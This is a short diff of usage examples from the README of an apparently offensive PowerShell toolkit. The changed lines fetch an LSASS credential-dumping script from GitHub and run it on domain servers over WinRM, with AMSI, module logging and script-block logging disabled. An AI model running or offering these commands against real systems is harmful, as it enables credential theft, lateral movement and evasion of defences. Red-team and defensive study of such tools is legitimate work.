@@ -60,7 +60,7 @@ Run a PowerShell script through WinRM while bypassing AMSI, PowerShell Module Lo
 
 ```
 PS C:\> $payload = New-PowerLoader -Type PoSh -FileUrl 'https://raw.githubusercontent.com/tmenochet/PowerDump/master/LsassDump.ps1' -ArgumentList 'Invoke-LsassDump' -Bypass AMSI,PML,SBL
-PS C:\> Invoke-PowerExec -ScriptBlock $payload -Method WinRM -ComputerDomain ADATUM.CORP -ComputerFilter Servers -Threads 10
+PS C:\> Invoke-PowerExec -ScriptBlock $payload -Method WinRM -ComputerDomain ADATUM.CORP -ComputerFilter Servers
 ```
 
 Run a .NET assembly through WMI while bypassing AMSI and ETW:
